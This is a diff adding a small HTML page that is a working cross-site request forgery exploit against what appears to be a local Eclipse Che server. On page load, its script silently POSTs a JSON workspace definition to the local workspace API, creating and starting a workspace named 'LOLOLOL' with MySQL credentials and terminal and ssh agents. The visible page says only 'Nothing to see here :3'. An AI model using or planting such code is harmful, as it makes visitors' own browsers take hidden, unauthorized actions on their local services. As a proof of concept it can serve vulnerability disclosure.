@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html><head>
+<meta http-equiv="content-type" content="text/html; charset=windows-1252">
+<script>
+function myFunction()
+{
+  var bad = "{\"environments\":{\"default\":{\"recipe\":{\"contentType\":\"application/x-yaml\",\"type\":\"compose\",\"content\":\"services:\\n db:\\n  image: eclipse/mysql\\n  environment:\\n   MYSQL_ROOT_PASSWORD: password\\n   MYSQL_DATABASE: petclinic\\n   MYSQL_USER: petclinic\\n   MYSQL_PASSWORD: password\\n  mem_limit: 1073741824\\n dev-machine:\\n  image: eclipse/ubuntu_jdk8\\n  mem_limit: 2147483648\\n  depends_on:\\n   - db\\n\"},\"machines\":{\"db\":{\"servers\":{},\"agents\":[\"org.eclipse.che.exec\",\"org.eclipse.che.terminal\"],\"attributes\":{\"memoryLimitBytes\":\"1073741824\"}},\"dev-machine\":{\"servers\":{},\"agents\":[\"org.eclipse.che.exec\",\"org.eclipse.che.terminal\",\"org.eclipse.che.ws-agent\",\"org.eclipse.che.ssh\"],\"attributes\":{\"memoryLimitBytes\":\"2147483648\"}}}}},\"defaultEnv\":\"default\",\"projects\":[],\"commands\":[{\"commandLine\":\"mysql -u $MYSQL_USER -p$MYSQL_PASSWORD -e 'show databases;'\",\"name\":\"show databases\",\"type\":\"custom\",\"attributes\":{}}],\"name\":\"LOLOLOL\",\"links\":[]}";
+        var x = new XMLHttpRequest();
+        x.open("POST", "http://127.0.0.1:8080/api/workspace?namespace=che&attribute=stackId:java-mysql&start-after-create=true");
+        x.setRequestHeader('Content-Type', 'application/json');
+        x.send(bad);
+
+}
+</script>
+</head>
+
+<body onload="myFunction()">
+<h1>Nothing to see here :3</h1>
+    
+
+</body></html>
